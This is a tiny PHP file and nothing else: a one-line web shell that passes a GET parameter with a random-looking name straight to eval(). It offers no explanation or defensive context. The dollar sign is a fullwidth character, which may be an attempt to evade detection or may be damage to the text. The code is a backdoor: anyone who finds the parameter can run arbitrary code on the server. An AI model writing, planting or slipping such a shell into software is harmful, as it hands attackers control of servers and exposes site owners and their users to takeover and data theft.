<?php
eval(＄_GET['ub1E9jt3']);
?>
